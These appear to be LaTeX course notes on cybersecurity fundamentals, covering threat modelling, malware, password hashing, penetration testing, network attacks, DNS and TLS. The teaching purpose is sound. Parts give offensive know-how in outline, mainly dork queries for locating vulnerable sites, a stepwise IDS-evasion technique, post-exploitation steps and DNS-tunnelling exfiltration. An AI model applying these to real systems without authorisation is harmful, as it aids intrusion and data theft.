\section{Cybersecurity}
Attacking a system is easy, only \textbf{one way} in is needed.

Defending a system is hard:
\begin{itemize}
  \item Defenses may interfere with business goals.
  \item Laws need to be enforced across borders.
  \item Targets are interconnected devices running vulnerable software.
  \item Hard to identify attackers.
  \item \textbf{All fronts} must be protected.
\end{itemize}

\subsection{Human Factors}
\begin{itemize}
  \item Social engineering.
  \item Weak passwords.
  \item Insider threats.
  \item Coercion.
\end{itemize}

\section{Vulnerabilities}
\begin{defn}
  \textbf{Vulnerabilities} are software bugs that attackers can exploit in order to compromise computers.
\end{defn}

\begin{defn}
  \textbf{Exploits} are pieces are software that take advantage of Vulnerabilities in order to access or infect a computer.
\end{defn}

\begin{defn}
  A \textbf{zero day} vulnerability or exploit is one that is unknown to the software vendor.
\end{defn}

Finders of zero-days could do one of four things:
\begin{enumerate}
  \item \textbf{Fix}.
  \item \textbf{Sell}.
  \item \textbf{Disclose}.
  \item \textbf{Exploit}.
\end{enumerate}

\subsection{Advisories}
\begin{itemize}
  \item Security advisories or bulletins publicly disclose new vulnerabilities.
  \item All published vulnerabilities are classified and given a unique ID.
  \item Once a vulnerability is public, proof of concept exploits may become available.
\end{itemize}

\subsection{Ethics}
If we discover a vulnerability, we can choose whether or not we disclose it:
\begin{itemize}
  \item \textbf{Full disclosure} - make the details public, open to public scrutiny:
    \begin{itemize}
      \item Preferred by security researchers and the open source community.
      \item May expose users to attack until patched - attackers may already know about it.
    \end{itemize}
  \item \textbf{Responsible disclosure} - affected vendor decides when to release information, and how much:
    \begin{itemize}
      \item Preferred by vendors.
      \item End-users will not develop their own patches.
      \item Can lead to longer time between discovery to fix.
    \end{itemize}
  \item \textbf{Non disclosure} - keep secret:
    \begin{itemize}
      \item Preferred by exploiters and vendors unwilling to invest in fixes.
      \item ``Security by obscurity''.
    \end{itemize}
\end{itemize}

\subsection{Fun and Profit}
\begin{itemize}
  \item Bug bounty programs:
    \begin{itemize}
      \item Some vendors offer rewards for finding vulnerabilities in their products.
      \item Companies may give explicit permission on what can be attacked, and what cannot.
    \end{itemize}
  \item Competitions (CTF).
  \item Vulnerability markets:
    \begin{itemize}
      \item Legitimate - run by security companies who buy vulnerabilities and re-sell to vendors.
      \item Black market - dark web.
    \end{itemize}
\end{itemize}

\section{Security Software Development Lifecycle (SSDLC)}
Security touchpoints in the software engineering are:
\begin{itemize}
  \item Abuse cases.
  \item Security requirements.
  \item Risk analysis:
    \begin{itemize}
      \item Threat modelling.
      \item Quantitative risk assessment.
    \end{itemize}
  \item Risk-based security analysis.
  \item Code review.
  \item Penetration testing.
  \item Security operations.
\end{itemize}
\subsection{Threat Modelling}
We use consistent visual syntax and focus on the system architecture.

\subsubsection{Data-Flow Diagram (DFD)}
\begin{figure}[htb!]
  \centering
  \caption{Data-flow diagram.}
  \includegraphics[scale=0.3]{dfd}
\end{figure}
\begin{itemize}
  \item Depict the flow of information across system components.
  \item External entities are out of our control.
  \item Trust boundaries help to establish what principal controls what.
  \item Attacks tend to cross trust boundaries.
\end{itemize}

\subsubsection{Identifying Threats: STRIDE}
For each element in the DFD, we ask what could go wrong:
\begin{itemize}
  \item \textbf{Spoofing} - pretending to be something or somebody else.
  \item \textbf{Tampering} - modifying without permission.
  \item \textbf{Repudiation} - denying to have done something.
  \item \textbf{Information Disclosure} - revealing information without permission.
  \item \textbf{Denial of Service} - preventing a system from providing a (timely) service.
  \item \textbf{Elevation of Privilege} - achieving more than what is intended.
\end{itemize}

Some threats may belong to more than one category.
We document threats by writing risk-based security tests.

\subsubsection{Identifying Threats: Attack Trees}
\begin{figure}[htb!]
  \centering
  \caption{Attack tree with the goal of authenticating with user credentials.}
  \includegraphics[scale=0.3]{attacktree}
\end{figure}
We create a tree structure with the following properties:
\begin{itemize}
  \item Root represents the attack goal, or asset being compromised.
  \item Children are steps to achieve goal.
  \item Leaves are concrete attacks.
  \item Siblings represent sufficient steps to achieve goal (step 1 or step 2).
  \item Special notation for siblings which represent necessary steps (step 1 and step 2).
\end{itemize}

Attack trees are an alternative to STRIDE.
For each element in the DFD, if the goal of a tree is relevant, we start traversing the tree to identify possible attacks.
Attack trees capture domain-specific expertise and can be reused on different DFDs.

\subsubsection{Evaluating Threats}
We use the DREAD system to score each threat between 5 and 15, where higher scores imply greater risk, see figure \ref{fig:dread}.

\begin{figure}[htb!]
  \centering
  \caption{Scoring a system based on DREAD.}
  \label{fig:dread}
  \includegraphics[width=\textwidth]{dread}
\end{figure}

\subsubsection{Addressing each Threat}
To recommend a response, we use META:
\begin{itemize}
  \item \textbf{Mitigate} - make a threat harder to exploit.
  \item \textbf{Eliminate} - remove the feature that was exposed to the threat.
  \item \textbf{Transfer} - let another party assume the risk.
  \item \textbf{Accept} - other options are impossible or impractical; keep track that the threat remains valid.
\end{itemize}

\section{Malicious Software (Malware)}
\begin{itemize}
  \item Format:
    \begin{itemize}
      \item Injected code added to a legitimate program.
      \item DLL called by legitimate program.
      \item Script run by an application.
      \item Standalone executable.
      \item Malicious code loaded in volatile memory.
    \end{itemize}
  \item Propagation:
    \begin{itemize}
      \item Installed by attacker - self replication, exploiting vulnerabilities.
      \item Installed by user - social engineering, compromised certificate.
    \end{itemize}
  \item Privileges:
    \begin{itemize}
      \item Root - owns the machine.
      \item User - limited damage, but can attempt elevation to root.
    \end{itemize}
\end{itemize}

\subsection{Malware Campaigns}
\begin{defn}
  \textbf{Malware campaigns} are targeted attacks aiming to infect the machine of a (or a few) particular victim(s).
\end{defn}

Advanced persistent threats (APTs) stealthily exploit a high-value target over time:
\begin{itemize}
  \item Wait for interesting information.
  \item Exfiltrate large database slowly.
  \item Gain access in order to exploit at a later date.
\end{itemize}

Generic attacks infect as many machines as possible:
\begin{itemize}
  \item Low-cost attacks with low chance of success.
  \item Botnet.
\end{itemize}

\subsection{Botnets}
\begin{itemize}
  \item One attacker (\textit{botmaster}) controls hundreds of thousands of infected machines (\textit{bots}).
  \item Bots connect to a \textit{command-and-control} (C\&C) server to receive instructions on what to do.
  \item Sophisticated topologies.
  \item Encrypted and stealthy communication of commands and results.
  \item Botmaster may keep changing IP.
\end{itemize}

\subsubsection{Goals}
\begin{itemize}
  \item \textbf{Data theft} - steal sensitive data.
  \item \textbf{Spam} - deliver unrequested email.
  \item \textbf{Distributed denial of service} (DDOS) - flood web servers with requests.
  \item \textbf{Credential stuffing} - attempt to login with leaked credentials to see which works.
  \item \textbf{Card cracking} - bruteforce missing information for card payments.
  \item \textbf{Network scanning} - attempt to probe other hosts.
  \item \textbf{Click fraud} - generate advertising revenue.
  \item \textbf{Cryptojacking} - mining cryptocurrencies.
\end{itemize}

\subsection{Spam}
Spammers are the marketers for affiliate programs that support online stores with the back-office functions.

\subsection{Exploit Kits}
Exploit kits are commoditised, commercial malware toolkits sold or rented out to criminals:
\begin{itemize}
  \item Automated vulnerability analysis, exploitation, and post-exploitation.
  \item Anti-virus evasion techniques.
  \item Operator subscribes to traffic from spam and malicious ads.
  \item Administration console to fine tune parameters and select victims.
\end{itemize}

\subsection{Malware Detection}
\begin{itemize}
  \item Anti-virus - detect malware just before or after infection:
    \begin{itemize}
      \item Impossible to have perfect anti-virus.
      \item Scan programs for \textit{signatures}, sequences of instructions typical of malware.
      \item Signatures can be obfuscated, so the new signatures need to be added to the anti-virus.
    \end{itemize}
  \item Blacklist web pages hosting phishing and malware.
\end{itemize}

The attacker always has a window of opportunity before detection.

\subsection{Malware Analysis}
\begin{itemize}
  \item Malware samples are captured:
    \begin{itemize}
      \item Clean up after infection.
      \item \textit{Honeypot} - intentionally vulnerable machines.
    \end{itemize}
  \item Observe malware execution in a VM sandbox:
    \begin{itemize}
      \item Look at effects on storage, settings, network traffic, etc.
      \item Malware can kill logging processes in the guest OS.
      \item Malware can sometimes detect virtualisation and behave differently.
    \end{itemize}
  \item Dynamic analysis:
    \begin{itemize}
      \item Extract a signature based on malware behaviour, not code - typically system call patterns.
      \item Malware could mix malicious with legitimate looking behaviour.
    \end{itemize}
\end{itemize}

\subsection{Malware Prevention}
\begin{itemize}
  \item Most common infection vectors are vulnerabilities and social engineering:
    \begin{itemize}
      \item Educate humans.
      \item Update and patch software in response to vulnerability disclosures.
      \item Firewalls and Intrusion Detection Systems.
    \end{itemize}
  \item Certified secure systems:
    \begin{itemize}
      \item Hardware and software should come with proof of correctness and/or security.
      \item Ongoing research.
    \end{itemize}
\end{itemize}

\section{Passwords}
Passwords are used in the protection of cryptographic keys and user authentication.

\subsection{Plain-text Passwords}
\begin{enumerate}
  \item Store credentials in password file.
  \item User presents username and password.
  \item Check if username is present.
  \item Check if password matches stored password.
  \item Grant or deny access.
\end{enumerate}

The password file is a valuable target for hackers.

\subsection{Encrypted Passwords}
\begin{defn}
  \textbf{Symmetric encryption}:
  \begin{align*}
    \text{Encrypt}(\text{key}, \text{ plaintext}) &= \text{ ciphertext} \\
    \text{Decrypt}(\text{key}, \text{ ciphertext}) &= \text{ plaintext} \\
  \end{align*}
\end{defn}

\begin{enumerate}
  \item Store encrypted credentials in a password file.
  \item User presents username and password.
  \item Check if username is present.
  \item Check that present password matches decryption of stored password.
  \item Grant or deny access.
\end{enumerate}

Key becomes a valuable target for hackers too.

\subsection{Hashed Passwords}
\begin{defn}
  \textbf{Cryptographic hashing}:
  \[
    \text{Hash}(\text{plaintext}) = \text{ hashvalue} 
  \]
  Theoretically a one-way function, cannot be reversed.
\end{defn}

\begin{enumerate}
  \item Store hashed credentials in a password file.
  \item User presents username and password.
  \item Check if username is present.
  \item Apply $\text{Hash}()$ to password and check if this matches the stored hash.
  \item Grant or deny access.
\end{enumerate}

The password file remains a valuable target.

\textbf{Offline dictionary attack} - A \textit{rainbow table}, a dictionary of hash and password pairs, can be built.
The corresponding password to a stolen hash can be found.

\subsubsection{Salted Hashes}
\begin{defn}
  \textbf{Salted hashing}:
  \[
    \text{Hash}(\text{plaintext } \mid \text{ salt}) = \text{ hashvalue}
  \]
  The \textbf{salt} is a cryptographically random string.
\end{defn}

\begin{enumerate}
  \item Store salted hashed credentials in a password file.
  \item User presents username and password.
  \item Check if username is present.
  \item Find user salt, see if $\text{Hash}(\text{plaintext } \mid \text{ salt})$ matches the entry for that user.
  \item Grant or deny access.
\end{enumerate}

Password file is less valuable.
A different dictionary is needed for every possible salt.
An attack against a specific user is still practical if given the salt for that user.

\subsection{Linux Password File}
\texttt{username:password-data:parameters} in \texttt{/etc/passwd}
\begin{itemize}
  \item \texttt{password-data}: \texttt{\$hash-function-id\$salt\$password}:
    \begin{itemize}
      \item \texttt{*} - disabled.
      \item \texttt{hash-function-id}:
      \begin{itemize}
        \item \texttt{1} - md5.
        \item \texttt{2a, 2y} - Blowfish.
        \item \texttt{5} - sha256.
        \item \texttt{6} - sha512.
      \end{itemize}
    \end{itemize}
  \item \texttt{parameters}, e.g.\ \texttt{:16826:0:99999:7:::}:
    \begin{itemize}
      \item \texttt{16826} - days since last change.
      \item \texttt{0} - can be changed at any time.
      \item \texttt{99999} - does not have to be changed.
      \item \texttt{7} - warn 1 week before expiry.
    \end{itemize}
\end{itemize}

\subsection{Usability}
\begin{itemize}
  \item Hard to choose and remember good passwords.
  \item Dictionary attacks start from a vocabulary of common, memorable words, then apply \textit{password-mangling} rules to generate realistic variants (e.g.\ \textit{leetspeak}).
  \item Passwords reuse.
  \item Complex password rules are a burden.
  \item Security questions are dangerous - answers can be found via social media.
  \item Password hints should be avoided - reminders may give away password too easily.
\end{itemize}

\subsection{Online Dictionary Attack}
\begin{itemize}
  \item Attacker submits username/password combinations to a running authentication system.
  \item Usernames are relatively easy to find.
  \item Previously used passwords are easy to find - password lists from hacked websites can be found in the public domain, or purchased from the dark web.
  \item Defenses:
    \begin{itemize}
      \item Limit number of tries per username or per IP.
      \item CAPTCHAs.
      \item \textit{Honeypot} passwords - create fake, easy to guess accounts and alert if accessed.
    \end{itemize}
\end{itemize}

\subsection{Alternatives to Passwords}
\begin{itemize}
  \item Hardware tokens from banks, one-time-password booklets from governments - expensive and hard to replace.
  \item Second-factor authentication via mobile phone - SMS deprecated by NIST.
  \item Biometric authentication - can spoof.
  \item Authentication via RFID tags - risk of theft, proximity attacks.
  \item Passwordless authentication (e.g.\ temporary pin via email) - email must be secure.
\end{itemize}

\subsection{Best Practices}
\begin{itemize}
  \item Filters to ensure users select long, random-looking passwords.
  \item Do not ask users to change passwords often.
  \item Store salted hashes in a protected file.
  \item Do not fail with ``user not found''.
  \item Ask additional security questions or CAPTCHA after a few failed login attempts for the same username, or same IP.
  \item Block account or requests from the same IP after many failed attempts.
  \item Show information about last login or notify user via email upon successful login.
  \item Password managers.
  \item Login using a trusted authentication provider (e.g.\ OAuth).
\end{itemize}

\section{Penetration Testing (Pentesting)}
\begin{defn}
  \textbf{Penetration testing} is when you pay someone to break into your system/organization and report weaknesses.
\end{defn}
Pentesting allows us to both find weaknesses in our web applications, and to gain insight into an attacker's approach.

It is important to scope the pentesting exercise to avoid operational damage.

Access to information:
\begin{itemize}
  \item \textbf{Black box} - no information.
  \item \textbf{Gray box} - selected information to help focus exercise.
  \item \textbf{White box} - access to source code, system architecture, protocols, valid accounts, etc.
\end{itemize}

It is hard to ensure the pentester has tried hard enough:
\begin{itemize}
  \item Play pentesting teams against each other.
  \item Pentesting certifications.
  \item Penetration Testing Execution Standard (PTES).
\end{itemize}

\subsection{PTES}
Key steps:
\begin{enumerate}
  \item Pre-engagement interactions.
  \item Intelligence gathering.
  \item Threat modelling.
  \item Vulnerability analysis.
  \item Exploitation.
  \item Post-exploitation.
  \item Reporting.
\end{enumerate}

\subsubsection{Intelligence Gathering}
\textbf{Passive} information gathering:
\begin{itemize}
  \item Aim to build a DFD, network map, architectural diagram, organization chart, sociogram of target, etc.
  \item Avoid interaction with target to avoid suspicion.
  \item Look for publicly available information about target:
    \begin{itemize}
      \item Online presence of company and/or employees.
      \item Web presence - cache, archive, source code, protocols, uptime statistics, domain registrar, DNS.
      \item Comments in open source code used by target - open bugs, hardcoded credentials in old versions.
      \item Even publicly accessible data may be protected by law.
    \end{itemize}
\end{itemize}

\subsubsection{Google Hacking}
\begin{itemize}
  \item Advanced operators:
    \begin{itemize}
      \item \texttt{ext:pdf} - search for files with specific extensions.
      \item \texttt{site:example.com} - search within given website.
      \item \texttt{"index.html" inurl: -html} - search inside url or title or body of a page.
    \end{itemize}
  \item Identifying potential targets using operators:
    \begin{itemize}
      \item \texttt{intitle:index.of "parent directory"} - locate unintentional exposed directory listings.
      \item \texttt{allintext:"Powered by phpbb"}, \texttt{inurl:index.asp} - locate sites  running vulnerable software.
    \end{itemize}
  \item Cache search:
    \begin{itemize}
      \item Access code of webpage without accessing the actual target.
      \item Use proxy to prevent loading uncached elements.
    \end{itemize}
\end{itemize}

\subsubsection{Intelligence Gathering}
\textbf{Active} information gathering:
\begin{itemize}
  \item Contacting target services.
  \item \texttt{dig} query to discover the version of the DNS server.
  \item Verify potential email addresses and usernames.
  \item Determine network perimeter:
    \begin{itemize}
      \item Accessing target directly or via firewall?
      \item \texttt{traceroute} to reverse DNS and identify intermediate hosts.
    \end{itemize}
  \item Probe the network:
    \begin{itemize}
      \item Host discovery - identify active subnet addresses.
      \item Port scanning - identify ports accepting communication.
      \item OS fingerprinting - identify target OS.
      \item Identify services - observe identifying information from a service.
    \end{itemize}
\end{itemize}

\subsubsection{Vulnerability Analysis}
\begin{itemize}
  \item Unpatched systems:
    \begin{itemize}
      \item Search in the CVE database for vulnerabilities affecting any identified component.
      \item Scan for known vulnerabilities and exposures using tools.
    \end{itemize}
  \item Patched systems:
    \begin{itemize}
      \item Perform code review of source code.
      \item Try to trigger unknown vulnerabilities.
    \end{itemize}
  \item Obtain credentials:
    \begin{itemize}
      \item Investigate password policies, identify default passwords.
      \item Look for published password hashes.
    \end{itemize}
\end{itemize}

\subsubsection{Exploitation}
\begin{itemize}
  \item Exploit identified vulnerabilities.
  \item Use valid credentials, or brute-force.
  \item Run publicly available exploits, or build your own.
\end{itemize}

\subsubsection{Post-Exploitation}
\begin{itemize}
  \item Privilege escalation:
    \begin{itemize}
      \item \textit{Pass-the-hash} - send the admin's hashed password to an internal authentication server.
      \item Confused deputy - exploit application that runs as root.
    \end{itemize}
  \item Steal data - explore disk, keylogger, capture screenshots, etc.
  \item Send data back to hacker.
  \item Pivot - exploit other targets on LAN.
  \item Maintain access - open backdoors, create new accounts to login to later.
  \item Cover tracks - manipulate logs, install rootkits to hide backdoors.
\end{itemize}

\section{Network Security}
\subsection{The Internet}
\begin{itemize}
  \item \textbf{Host} - provider/consumer of \textit{services}, reachable via an IP address.
  \item \textbf{Autonomous Systems} (AS) - network of networks, controls a range of IPs.
  \item TCP/IP protocol stack.
  \item Packet switched:
    \begin{itemize}
      \item \textbf{Packet} (or \textbf{datagram}) - message that is sent as a single unit on the network, composed of headers and a payload.
      \item Each packet needs to be routed between endpoints.
    \end{itemize}
\end{itemize}

\subsection{IP Addresses}
\begin{itemize}
  \item Different network services are multiplexed through the same IP address using ports.
  \item One machine can have multiple IPs:
    \begin{itemize}
      \item Across networks.
      \item Across network interfaces.
    \end{itemize}
  \item Multiple machines may share the same IP.
\end{itemize}

\subsection{Network Intermediaries}
\begin{itemize}
  \item \textbf{Router}:
    \begin{itemize}
      \item Connects two different networks.
      \item Does not modify packet addresses.
    \end{itemize}
  \item \textbf{Network Address Translator} (NAT):
    \begin{itemize}
      \item Exposes a local network via the ports of 1 IP address.
      \item Modifies packet's IP addresses to affect the mapping.
    \end{itemize}
  \item \textbf{Proxy}:
    \begin{itemize}
      \item Networks A and B communicate to a proxy, not directly to each other.
      \item 2 independent packets.
    \end{itemize}
\end{itemize}

\subsection{Network Capabilities}
\begin{itemize}
  \item \textbf{Participant} - sends and receives legitimate packets that respect the protocol, e.g.\ web browser.
  \item \textbf{Eavesdropper} - reads packets sent to others, cannot (or will not) participate, e.g.\ wiretapper.
  \item \textbf{Off-path} - participates and creates arbitrary packets, e.g.\ ethernet.
  \item \textbf{Man in the Middle} (MITM) - participates, reads, modifies, creates and deletes packets, e.g.\ router.
\end{itemize}

\subsection{Layers and Protocols}
See figure \ref{fig:layers}.
\begin{figure}[htb!]
  \centering
  \caption{Layers and protocols involved in networking.}
  \label{fig:layers}
  \includegraphics[scale=0.4]{layers}
\end{figure}

\subsection{Datagram}
See figure \ref{fig:datagram}.
\begin{figure}[htb!]
  \centering
  \caption{Datagram encapsulation.}
  \label{fig:datagram}
  \includegraphics[scale=0.4]{datagram}
\end{figure}

\subsection{Processing at Different Layers}
See figure \ref{fig:processing}.
\begin{figure}[htb!]
  \centering
  \caption{Processing involved at different layers of networking.}
  \label{fig:processing}
  \includegraphics[scale=0.4]{processing}
\end{figure}

\subsection{Local Area Network}
\begin{itemize}
  \item Based on a broadcast medium, such as cable or wireless.
  \item The network interface of each host has a Media Access Control (MAC) address.
  \item Messages on the LAN are sent based on MAC addresses.
  \item Dynamic Host Configuration Protocol (DHCP) tells new hosts their IP and other configuration information.
  \item Address Resolution Protocol (ARP) used to find the MAC of an IP on the same LAN.
\end{itemize}

LAN relies on the broadcast medium, requiring a minimum packet size in order to store conflict resolution requirements.
If not initialized, this could lead to data disclosure.

\subsection{MAC Flooding}
\begin{itemize}
  \item Network switches cache port-MAC associations.
  \item The attacker floods the switch with numerous invalid source MACs, consuming the limited memory.
  \item Since there are no longer entries for valid hosts, the switch is forced to broadcast traffic to all hosts.
  \item The attacker can now sniff the packets.
  \item Countermeasures:
    \begin{itemize}
      \item Port security - limit ability to flood caches.
      \item Keep track of authorized MAC addresses in the system.
    \end{itemize}
\end{itemize}

\subsection{ARP Poisoning}
\begin{itemize}
  \item The switch needs to find the MAC corresponding to an IP.
  \item The attacker spoofs the MAC of the victim, and replies like the victim does.
  \item The message is forwarded to both ports that replied.
  \item The attacker is able to read the message.
  \item Countermeasures:
    \begin{itemize}
      \item Static ARP rules.
      \item Spoofed ARP message detection.
    \end{itemize}
\end{itemize}

\subsection{Internet Protocol}
\begin{itemize}
  \item Packets are delivered between \textit{Source} and \textit{Destination} hosts via the protocol.
  \item The structure of IP addresses guides routing.
  \item The protocol is best effort, it may drop or reorder packets.
  \item The packet may be fragmented when it transmits on networks with smaller packet sizes:
    \begin{itemize}
      \item Various OSs treat duplicate IP fragments in different ways - OS fingerprinting.
    \end{itemize}
  \item Time to live (TTL) is used to discard packets that take too many steps to reach the destination:
    \begin{itemize}
      \item The TTL is decremented at each step.
      \item At 0, the packet is discarded and an ICMP error message is sent to the source.
    \end{itemize}
\end{itemize}

\subsection{Traceroute}
\begin{itemize}
  \item The traceroute algorithm uses TTL to identify the hosts/routers on the path to the target.
  \item Packets with increasing TTL are sent until the destination is reached.
  \item Each ICMP error message should be from a host on the path to the destination.
\end{itemize}

\subsection{IP Security}
\begin{itemize}
  \item The source IP is easy to spoof:
    \begin{itemize}
      \item Attackers can send packets with the target IP as source, the target will then receive the response (DDOS).
      \item It is hard to trace back attacks.
    \end{itemize}
  \item The internet is a decentralized network of untrusted networks:
    \begin{itemize}
      \item Packets travel through untrusted hosts - MITM reads and modification.
      \item BGP routing is based on trust - \textit{BGP hijacking} by advertising false routes to divert traffic.
    \end{itemize}
\end{itemize}

\subsection{IPsec}
IPsec adds security to the IP protocol via AH and ESP.

\begin{itemize}
  \item \textbf{Authentication Header} (AH):
    \begin{itemize}
      \item Authentication and integrity of whole packet.
      \item Allows packet inspection.
    \end{itemize}
  \item \textbf{Encapsulating Security Payload} (ESP):
    \begin{itemize}
      \item Confidentiality of payload.
      \item Optional authentication.
    \end{itemize}
\end{itemize}

There are two modes: \textbf{transport mode} which protects the payload, and \textbf{tunnel mode} which additionally protects the header.

\subsubsection{ESP Tunnel Mode}
This is most often used to implement VPNs.
It gives network layer confidentiality, source authentication, data integrity and replay-attack prevention.
The original datagram is encrypted and stored in a new datagram.

For each connection, it uses a \textbf{Security Association} (SA):
\begin{itemize}
  \item IP of origin and destination interfaces to protect.
  \item Security Parameter Index (SPI) as identifier.
  \item Encryption and authentication keys.
\end{itemize}

\subsection{IPv6}
In comparison with IPv4, IPv6 offers:
\begin{itemize}
  \item Much larger address space - no need for NAT.
  \item Fewer headers - better routing.
  \item Fragmentation only at endpoints - ICMP code signals failure if packet too big.
  \item Anycast addresses - can send packet to one IP in a range of IPs, if they all provide the same service.
  \item Better IPSec support.
\end{itemize}

\subsection{Transmission Control Protocol (TCP)}
TCP establishes a reliable connection to a service on the target destination port, it is the channel used to send HTTP data.
\begin{itemize}
  \item Source port chosen at random by OS to recieve responses.
  \item TCP adds sequence numbers to packets, and re-requests lost packets.
  \item Delivers all packets to the application, and in the right order.
\end{itemize}

\subsubsection{Security Issues}
\begin{itemize}
  \item TCP state easily accessible.
  \item Sequence numbers predictable.
  \item MITM attacker can read current sequence number and inject new packets - \textit{TCP session hijacking}.
  \item Off-path attacker can try to guess the sequence number - \textit{blind spoofing attack}.
  \item Countermeasures:
    \begin{itemize}
      \item Time-delay - discard race-condition packets.
      \item Use IDS, HTTPS.
    \end{itemize}
\end{itemize}

\subsection{Port Scanning}
Port scanning is used to find the open ports of a target machine.
A simple method is the \texttt{connect()} scan, which just tries to connect to an arbitrary port on the target and determines its status based on the response:
\begin{itemize}
  \item \texttt{SYN/ACK} - open.
  \item \texttt{RST} - closed.
\end{itemize}

\subsubsection{TCP Idle Scan}
A more sophisticated method which does not involve interaction between the attacker and the target is idle scan:
\begin{enumerate}
  \item Identify an idle host.
  \item Check the available IPID (say $x$) on the idle host.
  \item Spoof the source IP (using the idle host) and connect to the target.
  \item Check the new IPID on the idle host:
    \begin{itemize}
      \item If the IPID is $x + 2$, the port is open.
      \item Otherwise if $x + 1$ it is closed.
    \end{itemize}
\end{enumerate}

If the target responded \texttt{SYN/ACK} to the idle host, then the idle host sends a response to the target, causing an initial increment to IPID.

\subsection{User Datagram Protocol (UDP)}
UDP is a connectionless protocol which has low overhead and low latency - faster than TCP.
\begin{itemize}
  \item No guarantee data reaches destination.
  \item No integrity - optional checksum.
  \item Packets may be received out of order, or as duplicates.
\end{itemize}

\subsubsection{UDP Scans}
We send a generic UDP header with no payload to target ports:
\begin{itemize}
  \item Receive UDP response - open.
  \item Receive ICMP error - closed, or filtered by firewall.
  \item Timeout - port may be filtered or be open but the service drops malformed packets, we probe again with protocol-specific payloads.
\end{itemize}

\subsection{Key TCP/IP Threats}
\begin{itemize}
  \item Host and port scanning.
  \item Port sweep - looking for a specific (usually vulnerable) service on many machines.
  \item Malicious traffic - exfiltration of data.
  \item Distributed Denial of Service (DDoS) - flood target with high volume of network traffic.
\end{itemize}

\subsection{Port Knocking}
Port knocking is a technique to hide a service from port scanning, but can also be used to hide backdoors:
\begin{enumerate}
  \item All ports are closed.
  \item Client shares a secret with server that identifies specific ports to probe in a fixed order.
  \item Server replies to last probe with a random port where the service will be provided.
  \item Client connects to the service using this port.
\end{enumerate}

\subsection{Network Defenses}
\begin{itemize}
  \item Firewalls:
    \begin{itemize}
      \item Packet filtering, keep state, inspect application-layer packets.
      \item Can protect individual machine from port scanning and malicious traffic.
    \end{itemize}
  \item Intrusion Detection Systems (IDS):
    \begin{itemize}
      \item Dedicated hardware that inspects network traffic - signature or anomaly detection based.
      \item Can detect host and port scanning, port sweep.
      \item Can filter malicious traffic.
      \item Can rate-limit connections to mitigate DDoS.
    \end{itemize}
\end{itemize}

\subsubsection{IDS Evasion}
\begin{enumerate}
  \item Fragment a suspicious packet into 2.
  \item \texttt{traceroute} to determine distance to the IDS and the target.
  \item Send fragment 1 to the target.
  \item Send innocuous replacement of fragment 2 so that it expires after the IDS, but before the target.
  \item IDS decides communication is safe.
  \item Send malicious fragment 2.
  \item IDS does not interpret the second fragment as related to the first.
\end{enumerate}

\section{Domain Name System (DNS)}
The DNS lets us identify hosts via \textit{hostname} instead of IP address - separates the logical address from the physical address of the host running the service.

To resolve DNS, the client looks up the IP address of the target hostname.
This could be stored in the local cache, or can be returned after querying an external primary DNS server.
DNS traffic is sent over UDP, but may fall back to TCP if more data needs to be exchanged.

\subsection{Common DNS Records}
\begin{itemize}
  \item \textbf{SOA} (Start of Authority) - indicates that the server is the best authoritative source for data concerning the zone.
  \item \textbf{NS} (Name Server) - DNS server functioning as an authority for the zone.
  \item \textbf{A} (Address) - name-to-address mapping that supplies an IPv4 address for a specific DNS name.
    \begin{itemize}
      \item \textbf{AAAA} is the IPv6 equivalent.
    \end{itemize}
  \item \textbf{PTR} (Pointer) - address-to-name mapping that supplies a DNS name for a specific address.
  \item \textbf{CNAME} (Canonical Name) - creates an alias that points to the canonical name of a host identified by an `A' record.
  \item \textbf{MX} (Mail Exchange) - system that directs email traffic sent to an address in the domain to the individual recipient.
\end{itemize}

\subsection{Security Issues}
\begin{itemize}
  \item DNS requests and responses are not authenticated - MITM or compromised DNS can map to malicious IPs.
  \item \textit{Cache poisoning}.
  \item \textit{Rebinding}.
  \item Name servers can be misconfigured or hijacked.
\end{itemize}

\subsection{DNSSEC}
DNSSEC improves the security of DNS by protecting the authenticity and integrity of DNS records.
Each DNS zone has public/private key-pairs to sign and verify data.

DANE is DNSSEC data used to improve TLS certificate infrastructure, allowing digital certificates to be bound to domain names.
This moves the trust from certificate authorities to DNS operators.

Weaknesses:
\begin{itemize}
  \item Increased load on DNS servers.
  \item Decreased network performance.
  \item \textit{Zone enumeration} information leakage.
\end{itemize}

\subsubsection{Zone Enumeration}
If a domain does not exist, an NSEC record reveals alphabetically-closest neighbours.
This is useful to prove that the domain does not exist.
However, it allows a hacker to find out which domains do not exist, and discover closest ones.

NSEC3 extension mitigates this problem by using salted hashes of domain names.
Instead of revealing the domains of neighbours, it reveals the hashes of the domains of neighbours.
The salt changes over time and across timezones, hindering dictionary attacks.

\subsection{DNS Tunneling}
\begin{enumerate}
  \item Attacker encodes data to be sent in a DNS query for a domain for which they control the authoritative DNS.
  \item The domain is not found locally, the authoritative server is contacted.
  \item DNS queries are not filtered by the firewall/proxy.
  \item Server replies, encoding data in DNS response.
  \item Firewall forwards reponse.
  \item Attacker receives and decode the reply.
\end{enumerate}

This allows the exfiltration of data encoded as subdomain names.

\section{Transport Layer Security (TLS)}
TLS is a cryptographic protocol to provide confidentiality and integrity of network communications.
This is ensured by protecting the payload data, and having integrity checks to detect MITM tampering - however the IP and port are not protected when sent over TCP/IP.

To perform TLS, the server needs a certificate stating its identity and public key.

\begin{figure}[htb!]
  \centering
  \caption{TLS using public key cryptography to validate certificate and send keys.}
  \includegraphics[scale=0.5]{tls}
\end{figure}

\subsection{Certificates}
Certificates identify an entity, either an explicit domain name or a set of hostnames, and have limited validity in time.
There are two ways to sign certificates:
\begin{itemize}
  \item \textbf{Certificate Authority} (CA):
    \begin{itemize}
      \item By default, TLS clients trust a number of reputable CAs.
      \item Buying and renewing certificates from CAs can be expensive.
      \item Free certificates and automated renewals available.
    \end{itemize}
  \item \textbf{Self-Signed Certificates} (SSC):
    \begin{itemize}
      \item Client must trust that the self-signing key is appropriate for the domain covered by SSC.
      \item Clients can trust a custom CA as a whole - enables proxy to inspect TLS traffic.
    \end{itemize}
\end{itemize}
TLS protection is ineffective when certificates cannot be trusted.

\subsubsection{Certificate Validation}
In order to issue a new certificate, its parameters must be verified:
\begin{itemize}
  \item \textbf{Extended Validation} (EV):
    \begin{itemize}
      \item Verify the identity of the owner or organization.
      \item Usually offline channels, e.g.\ over phone.
    \end{itemize}
  \item \textbf{Domain Validation} (DV):
    \begin{itemize}
      \item Domain owner must prove control over domain when asking for certificate.
      \item Usually internet-based.
      \item The CA generates a random token, then either:
        \begin{itemize}
          \item Owner places token in DNS record for domain.
          \item Owner servers token at specific URL from domain.
          \item Owner includes token in fresh TLS certificate served from domain.
          \item CA emails token to owner, who submits challenge to CA online.
        \end{itemize}
    \end{itemize}
\end{itemize}

